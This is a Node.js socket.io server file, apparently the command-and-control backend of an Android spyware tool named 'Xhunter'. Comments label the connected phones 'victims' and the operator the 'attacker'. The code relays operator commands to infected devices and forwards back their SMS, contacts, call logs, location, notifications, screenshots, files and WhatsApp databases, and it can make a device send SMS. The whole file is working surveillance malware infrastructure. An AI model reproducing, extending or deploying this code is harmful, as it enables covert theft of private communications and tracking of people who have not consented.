const express = require('express');
const app = express()
const server = require('http').createServer(app)
const { Server } = require('socket.io')
const io = new Server(server, {
  maxHttpBufferSize: 1e8, // 1mb
  pingTimeout: 60000, // allow admin clients extra time while processing large chunks
});

var victimList={};
var deviceList={};
var victimData={};
var adminSocketId=null;
const port = 8080;

server.listen(process.env.PORT || port, (err) => {  if (err) return;log("Server Started : " + port);});
app.get('/', (req, res) => res.send('Welcome to Xhunter Backend Server!!'))

io.on('connection', (socket) => {
    log(`Socket connected: ${socket.id}`, {
        address: socket.handshake?.address,
        userAgent: socket.handshake?.headers?.['user-agent']
    });

    socket.on('adminJoin', ()=>{
        adminSocketId=socket.id;
        log(`Admin joined => socketId ${socket.id}`);
        if(Object.keys(victimData).length>0){
            Object.keys(victimData).map((key)=>socket.emit("join", victimData[key]));
        }
    })
    socket.on('request', request);//from attacker
    socket.on('join',(device)=>{
        log("Victim joined => socketId "+JSON.stringify(socket.id));
        victimList[device.id] =  socket.id;
        victimData[device.id]= {...device,socketId: socket.id};
        deviceList[socket.id] =  {
          "id":  device.id,
          "model":  device.model
        }
        socket.broadcast.emit("join", {...device,socketId: socket.id});
      });

      socket.on('getDir',(data)=>response("getDir",data));
      socket.on('getInstalledApps',(data)=>response("getInstalledApps",data));
      socket.on('getContacts',(data)=>response("getContacts",data));
      socket.on('sendSMS',(data)=>response("sendSMS",data));
      socket.on('getCallLog',(data)=>response("getCallLog",data));
      socket.on("previewImage", (data) =>response("previewImage",data));
      socket.on("error", (data) =>response("error",data));
      socket.on("getSMS", (data) =>response("getSMS",data));
      socket.on('getLocation',(data)=>response("getLocation",data));
      socket.on('getNotifications',(data)=>response("getNotifications",data));
      socket.on('takeScreenshot',(data)=>response("takeScreenshot",data));

      // Backup event listeners - acknowledge backup initiation
      socket.on('backupSMS', () => handleBackupInitiation(socket, 'backupSMS', 'SMS'));
      socket.on('backupContacts', () => handleBackupInitiation(socket, 'backupContacts', 'Contacts'));
      socket.on('backupCallLog', () => handleBackupInitiation(socket, 'backupCallLog', 'Call Log'));
      socket.on('backupNotifications', () => handleBackupInitiation(socket, 'backupNotifications', 'Notifications'));

     
      socket.on('disconnect', () => {
        log(`Socket disconnected: ${socket.id}`, {
            isAdmin: socket.id === adminSocketId,
        });
        if(socket.id===adminSocketId){
            adminSocketId=null
        }else{
            response("disconnectClient",socket.id)
            Object.keys(victimList).map((key)=>{
                if(victimList[key] === socket.id){
                  delete victimList[key]
                  delete victimData[key]
                }
              })
        }
    });
    
    socket.on("download", (d, callback) =>responseBinary("download", d, callback));
    socket.on("downloadWhatsappDatabase", (d, callback) => {
        log(`Forwarding downloadWhatsappDatabase payload from ${socket.id}`);
        socket.broadcast.emit("downloadWhatsappDatabase", d, callback);
       });


});

const request =(d)=>{// request from attacker to victim
    let payload;
    try {
        payload = typeof d === 'string' ? JSON.parse(d) : d;
    } catch (err) {
        log.error("Failed to parse request payload", { error: err.message });
        return;
    }

    const { to, action, data } = payload;

    if (!to || !victimList[to]) {
        log.warn(`Request attempted for unknown victim "${to}"`, { action });
        return;
    }

    log("Requesting action", { action, to, fromSocket: payload.from });
    io.to(victimList[to]).emit(action, data);
  }

const response =(action, data)=>{// response from victim to attacker
    if(adminSocketId){
        log("response action: "+ action);
        io.to(adminSocketId).emit(action, data);
    } else {
        log.warn(`No admin connected to receive response for action "${action}"`);
    }
  }
  
// const responseBinary =(action, data, callback)=>{// response from victim to attacker
//     if(adminSocketId){
//         log("response action: "+ action);
//         callback("success")
//         io.to(adminSocketId).emit(action, data);
//     }
//   }

const formatSize = (bytes = 0) => {
    if (!bytes) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round((bytes / Math.pow(k, i)) * 100) / 100 + ' ' + sizes[i];
};

const responseBinary = (action, data, callback) => { // response from mobile
    const adminSocket = adminSocketId ? io.sockets.sockets.get(adminSocketId) : null;

    // Calculate data size for logging
    let dataSize = 0;
    if (data) {
        if (typeof data === 'string') {
            dataSize = Buffer.byteLength(data, 'utf8');
        } else if (Buffer.isBuffer(data)) {
            dataSize = data.length;
        } else if (typeof data === 'object') {
            try {
                dataSize = Buffer.byteLength(JSON.stringify(data), 'utf8');
            } catch (err) {
                dataSize = 0;
                log(`responseBinary: Failed to calculate payload size -> ${err.message}`);
            }
        }
    }

    log(`response action: ${action} | size: ${formatSize(dataSize)}`);

    if (!adminSocket) {
        log(`responseBinary: No admin connected to receive "${action}" payload. Acknowledging sender to avoid blocking.`);
        callback("success");
        return;
    }

    const summary = {
        fileName: data && data.fileName ? data.fileName : undefined,
        uploaded: typeof data?.fileUploadedSize === 'number' ? data.fileUploadedSize : undefined,
        total: typeof data?.fileSize === 'number' ? data.fileSize : undefined,
        chunkSize: typeof data?.chunkSize === 'number' ? data.chunkSize : undefined,
        encoding: data && data.encoding ? data.encoding : undefined,
    };

    adminSocket
        .timeout(300000)
        .emit(action, data, (err, responses) => {
            if (err) {
                log(`responseBinary: Ack timeout for "${action}" -> ${err.message || err}`);
                callback("success");
                return;
            }

            const response = Array.isArray(responses) ? responses[0] : responses;
            if (response && typeof response === 'object') {
                if (response.status === 'error') {
                    log(`responseBinary: Admin reported error for "${action}": ${response.message || 'unknown error'}`);
                    callback(`error: ${response.message || 'admin error'}`);
                    return;
                }
                const statusLog = [
                    `Admin ack for "${action}" received`,
                    summary.fileName ? `file=${summary.fileName}` : null,
                    summary.uploaded != null && summary.total != null
                        ? `progress=${summary.uploaded}/${summary.total}`
                        : null,
                    summary.chunkSize != null ? `chunk=${summary.chunkSize}` : null,
                    summary.encoding ? `encoding=${summary.encoding}` : null,
                ]
                    .filter(Boolean)
                    .join(' | ');
                if (statusLog.length > 0) {
                    log(`responseBinary: ${statusLog}`);
                }
            }

            callback("success");
        });
};

// Handle backup initiation and send response to admin
const handleBackupInitiation = (socket, action, moduleName) => {
    const deviceInfo = deviceList[socket.id];
    const deviceId = deviceInfo ? deviceInfo.id : 'Unknown';
    const deviceModel = deviceInfo ? deviceInfo.model : 'Unknown';
    
    log(`${moduleName} backup initiated for device: ${deviceModel} (${deviceId})`);
    
    // Send acknowledgment to admin that backup process has started
    if(adminSocketId){
        const backupResponse = {
            action: action,
            module: moduleName,
            status: 'initiated',
            deviceId: deviceId,
            deviceModel: deviceModel,
            timestamp: new Date().toISOString(),
            message: `${moduleName} backup process initiated on device ${deviceModel}`
        };
        io.to(adminSocketId).emit('backupStatus', backupResponse);
        log(`Backup status sent to admin: ${JSON.stringify(backupResponse)}`);
    } else {
        log.warn(`Backup status not sent, no admin connected`, { action, deviceId });
    }
  }
// LOGGER
const serializeMeta = (meta) => {
    if (meta == null) return '';
    if (typeof meta === 'string') return meta;
    try {
        return JSON.stringify(meta);
    } catch (err) {
        return `unserializable-meta: ${err.message}`;
    }
};

const logBase = (level, message, meta) => {
    const timestamp = new Date().toISOString();
    const serializedMeta = serializeMeta(meta);
    const output = serializedMeta ? `${message} | ${serializedMeta}` : message;
    const formatted = `[${timestamp}] [${level}] ${output}`;

    if (level === 'ERROR') {
        console.error(formatted);
        return;
    }
    if (level === 'WARN') {
        console.warn(formatted);
        return;
    }
    console.log(formatted);
};

const log = (message, meta) => logBase('INFO', message, meta);
log.info = log;
log.warn = (message, meta) => logBase('WARN', message, meta);
log.error = (message, meta) => logBase('ERROR', message, meta);
